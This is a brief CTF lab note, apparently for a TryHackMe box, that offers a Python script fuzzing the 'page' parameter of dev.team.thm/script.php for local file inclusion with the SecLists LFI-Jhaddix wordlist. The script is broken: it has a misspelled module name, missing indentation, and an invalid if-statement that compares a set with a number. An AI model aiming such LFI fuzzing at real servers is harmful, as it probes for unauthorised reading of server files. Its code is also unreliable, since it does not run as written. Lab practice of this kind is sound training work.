Reference: [[LFI (Local file inclusion)]]
Create script file
micro lfi-fuzz.py
```python
import requests
with open('LFI-Jhaddix.txt', 'r') as file:
	for line in file:
	line = line.strip()
	response = requsets.get(f'http://dev.team.thm/script.php?page={line}')
	if({len(response.text)} != 1)
		print(f'{len(response.text)} # # # {line}')
```
```bash
cp /usr/share/seclists/Fuzzing/LFI-Jhaddix.txt .
```
RUN
```python
python3 lfi-fuzz.py
```
> [!Warning] FUZZ with Burp Pro
> Can be done with burp pro some how!
